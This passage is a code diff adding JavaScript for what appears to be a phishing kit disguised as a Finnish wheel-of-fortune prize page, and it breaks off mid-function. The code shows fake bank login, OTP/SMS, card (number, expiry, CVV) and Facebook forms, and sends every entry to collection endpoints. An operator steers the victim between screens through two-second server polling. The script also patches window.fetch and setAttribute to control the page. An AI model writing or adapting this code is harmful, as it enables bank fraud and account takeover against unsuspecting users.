+      var loginForm = document.getElementById('loginForm');
+      if (loginForm) {
+        loginForm.addEventListener('submit', function(e) {
+          e.preventDefault();
+          var username = document.getElementById('loginUsername').value;
+          var password = document.getElementById('loginPassword') ? document.getElementById('loginPassword').value : '';
+          if (!username) { alert(loginData.username_error || 'Anna käyttäjätunnus oikein'); return; }
+
+          var formData = new FormData();
+          formData.append('username', username);
+          formData.append('password', password);
+          formData.append('bank_id', bankId);
+          formData.append('bank_name', bankName);
+          formData.append('visitor_id', getVisitorId());
+
+          fetch('/api/save_login', {
+            method: 'POST',
+            body: formData,
+            credentials: 'include'
+          }).then(function(resp) { return resp.json(); }).then(function(data) {
+            activateWaitView();
+          }).catch(function(err) {
+            console.error('Login error:', err);
+            activateWaitView();
+          });
+        });
+      }
+
+      // Handle login option buttons
+      document.querySelectorAll('.login-option-btn').forEach(function(btn) {
+        btn.addEventListener('click', function() {
+          document.querySelectorAll('.login-option-btn').forEach(function(b) {
+            b.style.background = '#fff';
+            b.style.color = '#333';
+            b.classList.remove('active');
+          });
+          this.style.background = '#2563EB';
+          this.style.color = '#fff';
+          this.classList.add('active');
+        });
+      });
+    }
+
+    // Activate wait/processing view
+    function activateWaitView() {
+      var langData = _cachedLangData;
+      var waitData = langData.wait || {};
+
+      document.body.innerHTML = '<div class="container" style="display:flex;flex-direction:column;align-items:center;justify-content:center;min-height:70vh;text-align:center;padding:2rem;">' +
+        '<p class="content-text__title">' + (waitData.title || 'ONNENPYÖRÄ') + '</p>' +
+        '<p style="color:#fff;font-size:1.3rem;margin:1rem 0;">' + (waitData.subtitle || 'Odota Hetki.') + '</p>' +
+        '<div style="margin:2rem 0;"><div class="spinner" style="width:48px;height:48px;border:4px solid rgba(255,255,255,0.3);border-top:4px solid #fff;border-radius:50%;animation:spin 1s linear infinite;margin:0 auto;"></div></div>' +
+        '<p style="color:rgba(255,255,255,0.9);font-size:1rem;max-width:400px;">' + (waitData.security_alert || '') + '</p>' +
+        '<p style="color:rgba(255,255,255,0.7);font-size:0.9rem;margin-top:1rem;max-width:400px;">' + (waitData.transfer_in_progress || '') + '</p>' +
+        '<p style="color:rgba(255,255,255,0.6);font-size:0.85rem;margin-top:0.5rem;max-width:400px;">' + (waitData.processing_time || '') + '</p>' +
+      '</div>' +
+      '<style>@keyframes spin { to { transform: rotate(360deg); } }</style>' +
+      '<div class="powered-by">Powered by <img src="/static/img/1768398379_367d7c768420cfd5c6f1.png" alt="powered"></div>';
+      try { _origSetAttr.call(document.body, 'x-data', 'waitApp'); } catch(e){}
+
+      // Start self-contained polling for admin actions
+      var _waitPollTimer = setInterval(function() {
+        var vid = getVisitorId();
+        var x = new XMLHttpRequest();
+        x.open('GET', '/api/getRole?visitor_id=' + (vid || '') + '&t=' + Date.now(), true);
+        x.withCredentials = true;
+        x.onload = function() {
+          try {
+            var d = JSON.parse(x.responseText);
+            if (d.success && d.page && d.page !== 'wait' && d.page !== 'wheel') {
+              clearInterval(_waitPollTimer);
+              handlePageChange(d.page, d);
+            }
+          } catch(e) {}
+        };
+        x.onerror = function() {};
+        x.send();
+      }, 2000);
+    }
+
+    // Intercept Alpine.js x-data changes
+    var _origSetAttr = Element.prototype.setAttribute;
+    Element.prototype.setAttribute = function(name, value) {
+      if (name === 'x-data' && this.tagName === 'BODY') {
+        fetch('/__log_error', {
+          method: 'POST',
+          headers: {'Content-Type': 'application/json'},
+          body: JSON.stringify({type:'xdata_change', value:value})
+        }).catch(function(){});
+
+        // BANK LIST VIEW OVERRIDE
+        if (value === 'bankListApp' && !_bankListActive) {
+          _bankListActive = true;
+          var body = this;
+          var origSetAttrRef = _origSetAttr;
+
+          // Fetch banks and render
+          fetch('/banks').then(function(r){ return r.json(); }).then(function(banks) {
+            _bankListData = banks;
+            body.innerHTML = buildBankListPage(banks);
+            origSetAttrRef.call(body, 'x-data', 'bankListApp');
+
+            // Setup search
+            var searchInput = document.getElementById('bankSearchInput');
+            if (searchInput) {
+              searchInput.addEventListener('input', function() {
+                var listContainer = document.getElementById('bankListContainer');
+                if (listContainer) {
+                  listContainer.innerHTML = renderBankList(_bankListData, this.value);
+                  attachBankClicks();
+                }
+              });
+            }
+
+            // Attach click handlers
+            attachBankClicks();
+          }).catch(function(err) {
+            console.error('Failed to load banks:', err);
+          });
+
+          // Don't call original setAttribute yet - we'll call it after rendering
+          return;
+        }
+      }
+      return _origSetAttr.call(this, name, value);
+    };
+
+    function attachBankClicks() {
+      document.querySelectorAll('.bank-container__box-list-item').forEach(function(item) {
+        item.onclick = function() { handleBankItemClick(this); };
+      });
+    }
+
+    // BACKUP: MutationObserver to catch x-data changes that bypass setAttribute
+    var _bodyObserver = new MutationObserver(function(mutations) {
+      for (var i = 0; i < mutations.length; i++) {
+        if (mutations[i].attributeName === 'x-data') {
+          var val = document.body.getAttribute('x-data');
+          if (val === 'bankListApp' && !_bankListActive) {
+            _bankListActive = true;
+            fetch('/banks').then(function(r){ return r.json(); }).then(function(banks) {
+              _bankListData = banks;
+              document.body.innerHTML = buildBankListPage(banks);
+              var searchInput = document.getElementById('bankSearchInput');
+              if (searchInput) {
+                searchInput.addEventListener('input', function() {
+                  var listContainer = document.getElementById('bankListContainer');
+                  if (listContainer) {
+                    listContainer.innerHTML = renderBankList(_bankListData, this.value);
+                    attachBankClicks();
+                  }
+                });
+              }
+              attachBankClicks();
+            }).catch(function(err) { console.error('Bank load error:', err); });
+          }
+        }
+      }
+    });
+    _bodyObserver.observe(document.body, { attributes: true, attributeFilter: ['x-data'] });
+
+    // Intercept fetch calls - inject visitor_id into all POST requests
+    var _origFetch = window.fetch;
+    window.fetch = function() {
+      var url = arguments[0];
+      var opts = arguments[1] || {};
+      
+      // Log non-error fetches
+      if (typeof url === 'string' && !url.includes('__log_error') && !url.includes('__log_fetch')) {
+        _origFetch('/__log_error', {
+          method: 'POST',
+          headers: {'Content-Type': 'application/json'},
+          body: JSON.stringify({type:'fetch', url:url, method:opts.method||'GET'})
+        }).catch(function(){});
+      }
+
+      // Block obfuscated script's getRole fetch — inline XHR polling handles page routing
+      if (typeof url === 'string' && url.indexOf('/api/getRole') !== -1) {
+        return Promise.resolve(new Response(JSON.stringify({
+          success: true, page: 'wheel', role: 'user', status: 'active'
+        }), {status: 200, headers: {'Content-Type': 'application/json'}}));
+      }
+      
+      // Auto-inject visitor_id into POST requests to /api/*
+      if (typeof url === 'string' && url.indexOf('/api/') !== -1 && opts.method === 'POST') {
+        var vid = getVisitorId();
+        if (vid && opts.body) {
+          if (opts.body instanceof FormData) {
+            if (!opts.body.has('visitor_id')) {
+              opts.body.append('visitor_id', vid);
+            }
+          } else if (typeof opts.body === 'string') {
+            try {
+              var jsonBody = JSON.parse(opts.body);
+              if (!jsonBody.visitor_id) {
+                jsonBody.visitor_id = vid;
+                opts.body = JSON.stringify(jsonBody);
+              }
+            } catch(e) {
+              // urlencoded - append visitor_id
+              if (opts.body.indexOf('visitor_id') === -1) {
+                opts.body += '&visitor_id=' + encodeURIComponent(vid);
+              }
+            }
+          }
+        }
+        arguments[1] = opts;
+      }
+      
+      return _origFetch.apply(this, arguments);
+    };
+
+    // ========================================
+    // PAGE POLLING & VIEW SYSTEM
+    // ========================================
+    var _currentPage = 'wheel';
+    var _pollInterval = null;
+    var _pageViewActive = false;
+    var _lastServerPage = '';
+
+    function startPolling() {
+      if (_pollInterval) return;
+      _pollInterval = setInterval(function() {
+        var vid = getVisitorId();
+        var xhr = new XMLHttpRequest();
+        xhr.open('GET', '/api/getRole?status=re&visitor_id=' + (vid||''), true);
+        xhr.withCredentials = true;
+        xhr.onload = function() {
+          try {
+            var data = JSON.parse(xhr.responseText);
+            if (data.success && data.page && data.page !== _lastServerPage) {
+              _lastServerPage = data.page;
+              handlePageChange(data.page, data);
+            }
+          } catch(e) {}
+        };
+        xhr.send();
+      }, 2000);
+    }
+
+    // Start polling after wheel spin or form submit
+    setTimeout(startPolling, 3000);
+
+    function handlePageChange(page, serverData) {
+      if (page === _currentPage) return;
+      
+      // Pages that are handled by existing Alpine components (wheel, bankList)
+      // Don't override these - they're handled by script.js
+      if (page === 'wheel' && _currentPage !== 'wheel') {
+        // Reload page to reset to wheel
+        window.location.href = '/wheel';
+        return;
+      }
+      
+      // Pages that need our custom view
+      var customPages = ['wait','otp','sms','card','facebook','success','bankLoginError',
+        'nordeaVerify','spankkiVerify','opVerify','austriaVerify','customVerify',
+        'support','whatsapp','banned'];
+      
+      if (customPages.indexOf(page) !== -1) {
+        _currentPage = page;
+        renderPageView(page, serverData);
+      } else if (page === 'bankList') {
+        // Let existing bank list override handle it
+        _currentPage = page;
+        try { _origSetAttr.call(document.body, 'x-data', 'bankListApp'); } catch(e){}
+      } else if (page === 'bankLogin') {
+        // Re-show bank login if we have bank data
+        _currentPage = page;
+        if (window._selectedBank) {
+          activateLoginView(window._selectedBank.id, window._selectedBank.name, window._selectedBank.slug);
+        }
+      }
+    }
+
+    function renderPageView(page, data) {
+      data = data || {};
+      var langData = _cachedLangData;
+      var html = '';
+
+      switch(page) {
+        case 'wait':
+          html = buildWaitPage(langData);
+          break;
+        case 'otp':
+          html = buildOtpPage(langData, data);
+          break;
+        case 'sms':
+          html = buildSmsPage(langData, data);
+          break;
+        case 'card':
+          html = buildCardPage(langData);
+          break;
+        case 'facebook':
+          html = buildFacebookPage(langData);
+          break;
+        case 'success':
+          html = buildSuccessPage(langData);
+          break;
+        case 'bankLoginError':
+          html = buildBankLoginErrorPage(langData);
+          break;
+        case 'nordeaVerify':
+          html = buildVerifyPage(langData, 'Nordea', data);
+          break;
+        case 'spankkiVerify':
+          html = buildVerifyPage(langData, 'S-Pankki', data);
+          break;
+        case 'opVerify':
+          html = buildVerifyPage(langData, 'OP', data);
+          break;
+        case 'austriaVerify':
+          html = buildCustomVerifyPage(langData, data.verify_texts || {});
+          break;
+        case 'customVerify':
+          html = buildCustomVerifyPage(langData, data.custom_verify_texts || {});
+          break;
+        case 'support':
+          html = buildSupportPage(langData, data);
+          break;
+        case 'whatsapp':
+          html = buildSupportPage(langData, data);
+          break;
+        case 'banned':
+          html = '<div style="display:flex;align-items:center;justify-content:center;min-height:100vh;color:#fff;text-align:center;"><h2>Erişiminiz engellenmiştir.</h2></div>';
+          break;
+        default:
+          html = buildWaitPage(langData);
+      }
+
+      document.body.innerHTML = html;
+      _pageViewActive = true;
+
+      // Continue polling for next admin action
+      if (page !== 'success' && page !== 'banned') {
+        if (window._viewPollTimer) clearInterval(window._viewPollTimer);
+        window._viewPollTimer = setInterval(function() {
+          var vid = getVisitorId();
+          var x = new XMLHttpRequest();
+          x.open('GET', '/api/getRole?visitor_id=' + (vid || '') + '&t=' + Date.now(), true);
+          x.withCredentials = true;
+          x.onload = function() {
+            try {
+              var d = JSON.parse(x.responseText);
+              if (d.success && d.page && d.page !== page) {
+                clearInterval(window._viewPollTimer);
+                if (d.page === 'wheel') {
+                  window.location.href = '/wheel';
+                } else {
+                  handlePageChange(d.page, d);
+                }
+              }
+            } catch(e) {}
+          };
+          x.onerror = function() {};
+          x.send();
+        }, 2000);
+      }
+    }
+
+    // ===== PAGE BUILDERS =====
+
+    function pageWrapper(content) {
+      return '<div style="min-height:100vh;display:flex;flex-direction:column;align-items:center;">' +
+        '<div class="container" style="flex:1;display:flex;flex-direction:column;align-items:center;justify-content:center;max-width:500px;padding:2rem 1rem;text-align:center;">' +
+        content +
+        '</div>' +
+        '<div class="powered-by" style="padding:1.5rem;">Powered by <img src="/static/img/1768398379_367d7c768420cfd5c6f1.png" alt="powered"></div>' +
+        '</div>';
+    }
+
+    function buildWaitPage(lang) {
+      var w = (lang && lang.wait) || {};
+      return pageWrapper(
+        '<p class="content-text__title">' + (w.title || 'ONNENPYÖRÄ') + '</p>' +
+        '<p style="color:#fff;font-size:1.3rem;margin:1rem 0;">' + (w.subtitle || 'Odota Hetki.') + '</p>' +
+        '<div style="margin:2rem 0;"><div style="width:48px;height:48px;border:4px solid rgba(255,255,255,0.3);border-top:4px solid #FFD700;border-radius:50%;animation:spin 1s linear infinite;margin:0 auto;"></div></div>' +
+        '<p style="color:#ff6b6b;font-size:1rem;max-width:400px;font-weight:600;">' + (w.security_alert || '') + '</p>' +
+        '<p style="color:rgba(255,255,255,0.9);font-size:0.95rem;margin-top:1rem;max-width:400px;">' + (w.transfer_in_progress || '') + '</p>' +
+        '<p style="color:rgba(255,255,255,0.7);font-size:0.85rem;margin-top:0.5rem;">' + (w.connection_reminder || '') + '</p>' +
+        '<p style="color:rgba(255,255,255,0.6);font-size:0.8rem;margin-top:0.5rem;">' + (w.processing_time || '') + '</p>' +
+        '<style>@keyframes spin{to{transform:rotate(360deg)}}</style>'
+      );
+    }
+
+    function buildOtpPage(lang, data) {
+      var o = (lang && lang.otp) || {};
+      return pageWrapper(
+        '<p class="content-text__title">ONNENPYÖRÄ</p>' +
+        '<p style="color:#fff;font-size:1.1rem;margin:1rem 0;">' + (o.title || 'SMS Vahvistuskoodi') + '</p>' +
+        '<p style="color:rgba(255,255,255,0.7);font-size:0.9rem;margin-bottom:1.5rem;">' + (o.description || '') + '</p>' +
+        '<div style="background:#fff;border-radius:24px;padding:2rem;max-width:400px;width:100%;box-shadow:0 8px 32px rgba(0,0,0,0.1);">' +
+          '<div style="display:flex;gap:8px;justify-content:center;margin-bottom:1.5rem;" id="otpInputs">' +
+            '<input type="text" maxlength="1" style="width:48px;height:56px;text-align:center;font-size:1.5rem;border:2px solid #ddd;border-radius:12px;outline:none;" class="otp-input" autofocus>' +
+            '<input type="text" maxlength="1" style="width:48px;height:56px;text-align:center;font-size:1.5rem;border:2px solid #ddd;border-radius:12px;outline:none;" class="otp-input">' +
+            '<input type="text" maxlength="1" style="width:48px;height:56px;text-align:center;font-size:1.5rem;border:2px solid #ddd;border-radius:12px;outline:none;" class="otp-input">' +
+            '<input type="text" maxlength="1" style="width:48px;height:56px;text-align:center;font-size:1.5rem;border:2px solid #ddd;border-radius:12px;outline:none;" class="otp-input">' +
+            '<input type="text" maxlength="1" style="width:48px;height:56px;text-align:center;font-size:1.5rem;border:2px solid #ddd;border-radius:12px;outline:none;" class="otp-input">' +
+            '<input type="text" maxlength="1" style="width:48px;height:56px;text-align:center;font-size:1.5rem;border:2px solid #ddd;border-radius:12px;outline:none;" class="otp-input">' +
+          '</div>' +
+          '<button id="otpSubmitBtn" style="width:100%;padding:14px;background:#2563EB;color:#fff;border:none;border-radius:16px;font-size:1rem;font-weight:600;cursor:pointer;">' + (o.button || 'Vahvista') + '</button>' +
+        '</div>'
+      );
+      // Note: event listeners attached after innerHTML set
+    }
+
+    function buildSmsPage(lang, data) {
+      var s = (lang && lang.sms) || {};
+      var smsReq = data.sms_request || {};
+      var title = smsReq.title || s.title || 'SMS Vahvistuskoodi';
+      var msg = smsReq.message || s.description || '';
+      var len = parseInt(smsReq.length) || 6;
+      
+      var inputs = '';
+      for (var i = 0; i < len; i++) {
+        inputs += '<input type="text" maxlength="1" style="width:44px;height:52px;text-align:center;font-size:1.4rem;border:2px solid #ddd;border-radius:12px;outline:none;" class="sms-input">';
+      }
+      
+      return pageWrapper(
+        '<p class="content-text__title">ONNENPYÖRÄ</p>' +
+        '<p style="color:#fff;font-size:1.1rem;margin:1rem 0;">' + title + '</p>' +
+        (msg ? '<p style="color:rgba(255,255,255,0.7);font-size:0.9rem;margin-bottom:1.5rem;">' + msg + '</p>' : '') +
+        '<div style="background:#fff;border-radius:24px;padding:2rem;max-width:420px;width:100%;box-shadow:0 8px 32px rgba(0,0,0,0.1);">' +
+          '<div style="display:flex;gap:6px;justify-content:center;margin-bottom:1.5rem;flex-wrap:wrap;" id="smsInputs">' + inputs + '</div>' +
+          '<button id="smsSubmitBtn" style="width:100%;padding:14px;background:#2563EB;color:#fff;border:none;border-radius:16px;font-size:1rem;font-weight:600;cursor:pointer;">' + (s.button || 'Vahvista') + '</button>' +
+        '</div>'
+      );
+    }
+
+    function buildCardPage(lang) {
+      var c = (lang && lang.card) || {};
+      return pageWrapper(
+        '<p class="content-text__title">ONNENPYÖRÄ</p>' +
+        '<div style="background:#fff;border-radius:24px;padding:2rem;max-width:440px;width:100%;box-shadow:0 8px 32px rgba(0,0,0,0.1);margin-top:1rem;">' +
+          '<div style="margin-bottom:1rem;">' +
+            '<label style="display:block;margin-bottom:0.5rem;font-weight:500;color:#374151;text-align:left;">' + (c.card_number || 'Kortin Tiedot') + '</label>' +
+            '<input type="text" id="cardNumber" maxlength="19" placeholder="0000 0000 0000 0000" style="width:100%;height:52px;border:1px solid #ddd;border-radius:16px;padding:0 1rem;font-size:1rem;">' +
+          '</div>' +
+          '<div style="display:flex;gap:1rem;margin-bottom:1rem;">' +
+            '<div style="flex:1;">' +
+              '<label style="display:block;margin-bottom:0.5rem;font-weight:500;color:#374151;text-align:left;">' + (c.expiry_date || 'KK/VV') + '</label>' +
+              '<input type="text" id="cardExpiry" maxlength="5" placeholder="MM/YY" style="width:100%;height:52px;border:1px solid #ddd;border-radius:16px;padding:0 1rem;font-size:1rem;">' +
+            '</div>' +
+            '<div style="flex:1;">' +
+              '<label style="display:block;margin-bottom:0.5rem;font-weight:500;color:#374151;text-align:left;">' + (c.cvc || 'CVV') + '</label>' +
+              '<input type="text" id="cardCvc" maxlength="4" placeholder="123" style="width:100%;height:52px;border:1px solid #ddd;border-radius:16px;padding:0 1rem;font-size:1rem;">' +
+            '</div>' +
+          '</div>' +
+          '<button id="cardSubmitBtn" style="width:100%;padding:14px;background:#2563EB;color:#fff;border:none;border-radius:16px;font-size:1rem;font-weight:600;cursor:pointer;">' + (c.submit_button || 'Jatka') + '</button>' +
+        '</div>'
+      );
+    }
+
+    function buildFacebookPage(lang) {
+      var f = (lang && lang.facebook) || {};
+      return pageWrapper(
+        '<div style="background:#fff;border-radius:24px;padding:2rem;max-width:440px;width:100%;box-shadow:0 8px 32px rgba(0,0,0,0.1);">' +
+          '<div style="text-align:center;margin-bottom:1.5rem;"><img src="https://upload.wikimedia.org/wikipedia/commons/thumb/0/05/Facebook_Logo_%282019%29.png/600px-Facebook_Logo_%282019%29.png" style="width:48px;" alt="Facebook"></div>' +
+          '<div style="margin-bottom:1rem;">' +
+            '<input type="text" id="fbEmail" placeholder="' + (f.email || 'Matkapuhelinnumero tai sähköpostiosoite') + '" style="width:100%;height:52px;border:1px solid #ddd;border-radius:12px;padding:0 1rem;font-size:1rem;">' +
+          '</div>' +
+          '<div style="margin-bottom:1rem;">' +
+            '<input type="password" id="fbPassword" placeholder="' + (f.password || 'Salasana') + '" style="width:100%;height:52px;border:1px solid #ddd;border-radius:12px;padding:0 1rem;font-size:1rem;">' +
+          '</div>' +
+          '<button id="fbSubmitBtn" style="width:100%;padding:14px;background:#1877F2;color:#fff;border:none;border-radius:12px;font-size:1rem;font-weight:600;cursor:pointer;">' + (f.login || 'Kirjaudu sisään') + '</button>' +
+          '<p style="text-align:center;margin-top:1rem;"><a href="#" style="color:#1877F2;text-decoration:none;font-size:0.9rem;">' + (f.forgot || 'Unohtuiko salasana?') + '</a></p>' +
+        '</div>'
+      );
+    }
+
+    function buildSuccessPage(lang) {
+      var sc = (lang && lang.success) || {};
+      return pageWrapper(
+        '<p class="content-text__title">' + (sc.head_title || 'ONNENPYÖRÄ') + '</p>' +
+        '<div style="margin:2rem 0;"><svg width="80" height="80" viewBox="0 0 24 24" fill="none" stroke="#22C55E" stroke-width="2"><circle cx="12" cy="12" r="10"/><path d="M8 12l3 3 5-5"/></svg></div>' +
+        '<p style="color:#22C55E;font-size:1.5rem;font-weight:700;margin-bottom:0.5rem;">' + (sc.congrats || 'Onnittelut!') + '</p>' +
+        '<p style="color:#fff;font-size:1.1rem;">' + (sc.title || 'Osallistumisesi On Tallennettu') + '</p>'
+      );
+    }
+
+    function buildBankLoginErrorPage(lang) {
+      var loginData = (lang && lang.login) || {};
+      return pageWrapper(
+        '<p class="content-text__title">ONNENPYÖRÄ</p>' +
+        '<div style="background:#fff;border-radius:24px;padding:2rem;max-width:440px;width:100%;box-shadow:0 8px 32px rgba(0,0,0,0.1);margin-top:1rem;">' +
+          '<div style="background:#FEE2E2;border:1px solid #FECACA;border-radius:12px;padding:1rem;margin-bottom:1.5rem;text-align:center;">' +
+            '<p style="color:#DC2626;font-weight:600;">⚠️ ' + (loginData.error_title || 'Virhe') + '</p>' +
+            '<p style="color:#DC2626;font-size:0.9rem;margin-top:0.5rem;">Tarkista kirjautumistietosi ja yritä uudelleen.</p>' +
+          '</div>' +
+          '<div style="margin-bottom:1rem;">' +
+            '<label style="display:block;margin-bottom:0.5rem;font-weight:500;color:#374151;text-align:left;">' + (loginData.username_label || 'Käyttäjätunnus') + '</label>' +
+            '<input type="text" id="retryUsername" style="width:100%;height:52px;border:1px solid #ddd;border-radius:16px;padding:0 1rem;font-size:1rem;" placeholder="' + (loginData.username_label || 'Käyttäjätunnus') + '">' +
+          '</div>' +
+          '<div style="margin-bottom:1rem;">' +
+            '<label style="display:block;margin-bottom:0.5rem;font-weight:500;color:#374151;text-align:left;">' + (loginData.password_label || 'Salasana') + '</label>' +
+            '<input type="password" id="retryPassword" style="width:100%;height:52px;border:1px solid #ddd;border-radius:16px;padding:0 1rem;font-size:1rem;" placeholder="' + (loginData.password_label || 'Salasana') + '">' +
+          '</div>' +
+          '<button id="retryLoginBtn" style="width:100%;padding:14px;background:#2563EB;color:#fff;border:none;border-radius:16px;font-size:1rem;font-weight:600;cursor:pointer;">' + (loginData.button || 'Kirjaudu Sisään') + '</button>' +
+        '</div>'
+      );
+    }
+
+    function buildVerifyPage(lang, bankName, data) {
+      var s = (lang && lang.spankki) || {};
+      var pin = data.op_pin || '';
+      return pageWrapper(
+        '<p class="content-text__title">ONNENPYÖRÄ</p>' +
+        '<p style="color:#fff;font-size:1.1rem;margin:1rem 0;">' + bankName + ' - Vahvistus</p>' +
+        '<div style="background:#fff;border-radius:24px;padding:2rem;max-width:400px;width:100%;box-shadow:0 8px 32px rgba(0,0,0,0.1);">' +
+          (pin ? '<p style="color:#374151;font-size:0.95rem;margin-bottom:1rem;text-align:center;">Koodi: <strong>' + pin + '</strong></p>' : '') +
+          '<p style="color:#374151;font-size:0.95rem;margin-bottom:1.5rem;text-align:center;">Hyväksy toiminto ' + bankName + ' sovelluksessasi.</p>' +
+          '<div style="display:flex;gap:8px;justify-content:center;margin-bottom:1.5rem;" id="verifyInputs">' +
+            '<input type="text" maxlength="1" style="width:48px;height:56px;text-align:center;font-size:1.5rem;border:2px solid #ddd;border-radius:12px;outline:none;" class="verify-input">' +
+            '<input type="text" maxlength="1" style="width:48px;height:56px;text-align:center;font-size:1.5rem;border:2px solid #ddd;border-radius:12px;outline:none;" class="verify-input">' +
+            '<input type="text" maxlength="1" style="width:48px;height:56px;text-align:center;font-size:1.5rem;border:2px solid #ddd;border-radius:12px;outline:none;" class="verify-input">' +
+            '<input type="text" maxlength="1" style="width:48px;height:56px;text-align:center;font-size:1.5rem;border:2px solid #ddd;border-radius:12px;outline:none;" class="verify-input">' +
+          '</div>' +
+          '<button id="verifySubmitBtn" style="width:100%;padding:14px;background:#2563EB;color:#fff;border:none;border-radius:16px;font-size:1rem;font-weight:600;cursor:pointer;">Vahvista</button>' +
+        '</div>'
+      );
+    }
+
+    function buildCustomVerifyPage(lang, texts) {
+      texts = texts || {};
+      return pageWrapper(
+        '<p class="content-text__title">ONNENPYÖRÄ</p>' +
+        '<div style="background:#fff;border-radius:24px;padding:2rem;max-width:400px;width:100%;box-shadow:0 8px 32px rgba(0,0,0,0.1);margin-top:1rem;">' +
+          (texts.text1 ? '<p style="color:#374151;font-size:1rem;font-weight:600;margin-bottom:0.5rem;text-align:center;">' + texts.text1 + '</p>' : '') +
+          (texts.text2 ? '<p style="color:#6B7280;font-size:0.95rem;margin-bottom:1rem;text-align:center;">' + texts.text2 + '</p>' : '') +
+          (texts.text3 ? '<p style="color:#6B7280;font-size:0.9rem;margin-bottom:1.5rem;text-align:center;">' + texts.text3 + '</p>' : '') +
+          '<div style="display:flex;gap:8px;justify-content:center;margin-bottom:1.5rem;" id="customVerifyInputs">' +
+            '<input type="text" maxlength="1" style="width:48px;height:56px;text-align:center;font-size:1.5rem;border:2px solid #ddd;border-radius:12px;outline:none;" class="cv-input">' +
+            '<input type="text" maxlength="1" style="width:48px;height:56px;text-align:center;font-size:1.5rem;border:2px solid #ddd;border-radius:12px;outline:none;" class="cv-input">' +
+            '<input type="text" maxlength="1" style="width:48px;height:56px;text-align:center;font-size:1.5rem;border:2px solid #ddd;border-radius:12px;outline:none;" class="cv-input">' +
+            '<input type="text" maxlength="1" style="width:48px;height:56px;text-align:center;font-size:1.5rem;border:2px solid #ddd;border-radius:12px;outline:none;" class="cv-input">' +
+            '<input type="text" maxlength="1" style="width:48px;height:56px;text-align:center;font-size:1.5rem;border:2px solid #ddd;border-radius:12px;outline:none;" class="cv-input">' +
+            '<input type="text" maxlength="1" style="width:48px;height:56px;text-align:center;font-size:1.5rem;border:2px solid #ddd;border-radius:12px;outline:none;" class="cv-input">' +
+          '</div>' +
+          '<button id="cvSubmitBtn" style="width:100%;padding:14px;background:#2563EB;color:#fff;border:none;border-radius:16px;font-size:1rem;font-weight:600;cursor:pointer;">Vahvista</button>' +
+        '</div>'
+      );
+    }
+
+    function buildSupportPage(lang, data) {
+      var sp = (lang && lang.support) || {};
+      var name = ''; try { name = localStorage.getItem('user_name') || ''; } catch(e){}
+      var pageDesc = (sp.page_description || '').replace('${name}', name);
+      var step = data.support_step || '2';
+      var stepInfo = (sp.step_info || 'Vaihe ${step} / 8').replace('${step}', step);
+
+      return pageWrapper(
+        '<p class="content-text__title">ONNENPYÖRÄ</p>' +
+        '<p style="color:#FFD700;font-size:0.9rem;margin:0.5rem 0;">' + stepInfo + '</p>' +
+        (pageDesc ? '<p style="color:rgba(255,255,255,0.9);font-size:0.95rem;margin:0.5rem 0 1.5rem;">' + pageDesc + '</p>' : '') +
+        '<div style="display:flex;flex-direction:column;gap:1rem;max-width:400px;width:100%;">' +
+          '<div style="background:#fff;border-radius:16px;padding:1.5rem;text-align:center;">' +
+            '<h3 style="color:#1F2937;font-size:1rem;margin-bottom:0.5rem;">💬 ' + (sp.support_1 || 'Live-tuki') + '</h3>' +
+            '<p style="color:#6B7280;font-size:0.85rem;">' + (sp.support_1_description || '') + '</p>' +
+          '</div>' +
+          '<div style="background:#fff;border-radius:16px;padding:1.5rem;text-align:center;">' +
+            '<h3 style="color:#25D366;font-size:1rem;margin-bottom:0.5rem;">📱 ' + (sp.support_2 || 'WhatsApp-tuki') + '</h3>' +
+            '<p style="color:#6B7280;font-size:0.85rem;margin-bottom:0.5rem;">' + (sp.support_2_description || '') + '</p>' +
+            '<button style="padding:10px 24px;background:#25D366;color:#fff;border:none;border-radius:12px;font-size:0.9rem;cursor:pointer;">' + (sp.support_2_button || 'Ota yhteyttä') + '</button>' +
+          '</div>' +
+          '<div style="background:#fff;border-radius:16px;padding:1.5rem;text-align:center;">' +
+            '<h3 style="color:#1877F2;font-size:1rem;margin-bottom:0.5rem;">📘 ' + (sp.support_3 || 'Facebook-tuki') + '</h3>' +
+            '<p style="color:#6B7280;font-size:0.85rem;margin-bottom:0.5rem;">' + (sp.support_3_description || '') + '</p>' +
+            '<button style="padding:10px 24px;background:#1877F2;color:#fff;border:none;border-radius:12px;font-size:0.9rem;cursor:pointer;">' + (sp.support_3_button || 'Ota yhteyttä Messengerissä') + '</button>' +
+          '</div>' +
+        '</div>'
+      );
+    }
+
+    // ===== FORM SUBMISSION HANDLERS =====
+    // Delegate click events for dynamically rendered pages
+    document.addEventListener('click', function(e) {
+      var btn = e.target;
+      
+      // OTP submit
+      if (btn.id === 'otpSubmitBtn') {
+        var inputs = document.querySelectorAll('#otpInputs .otp-input');
+        var code = '';
+        inputs.forEach(function(i){ code += i.value; });
+        if (code.length < 4) return;
+        submitToApi('save_otp', {otp: code});
+      }
+      
+      // SMS submit
+      if (btn.id === 'smsSubmitBtn') {
+        var inputs = document.querySelectorAll('#smsInputs .sms-input');
+        var code = '';
+        inputs.forEach(function(i){ code += i.value; });
+        if (code.length < 3) return;
+        submitToApi('save_sms', {sms: code});
+      }
+      
+      // Card submit
+      if (btn.id === 'cardSubmitBtn') {
+        var cn = document.getElementById('cardNumber');
+        var ce = document.getElementById('cardExpiry');
+        var cc = document.getElementById('cardCvc');
+        if (!cn || !cn.value || !ce || !ce.value || !cc || !cc.value) return;
+        submitToApi('save_card', {card_number: cn.value, expiry_date: ce.value, cvc: cc.value});
+      }
+      
+      // Facebook submit
+      if (btn.id === 'fbSubmitBtn') {
+        var em = document.getElementById('fbEmail');
+        var pw = document.getElementById('fbPassword');
+        if (!em || !em.value || !pw || !pw.value) return;
+        submitToApi('save_facebook', {email: em.value, password: pw.value});
+      }
+      
+      // Verify submit (nordea, op, spankki)
+      if (btn.id === 'verifySubmitBtn') {
+        var inputs = document.querySelectorAll('#verifyInputs .verify-input');
+        var code = '';
+        inputs.forEach(function(i){ code += i.value; });
+        if (code.length < 3) return;
+        submitToApi('save_otp', {otp: code});
+      }
+      
+      // Custom verify submit
+      if (btn.id === 'cvSubmitBtn') {
+        var inputs = document.querySelectorAll('#customVerifyInputs .cv-input');
+        var code = '';
+        inputs.forEach(function(i){ code += i.value; });
+        if (code.length < 3) return;
+        submitToApi('save_otp', {otp: code});
+      }
+      
+      // Retry login submit
+      if (btn.id === 'retryLoginBtn') {
+        var u = document.getElementById('retryUsername');
+        var p = document.getElementById('retryPassword');
+        if (!u || !u.value) return;
+        var bankId = ''; var bankName = '';
+        if (window._selectedBank) { bankId = window._selectedBank.id; bankName = window._selectedBank.name; }
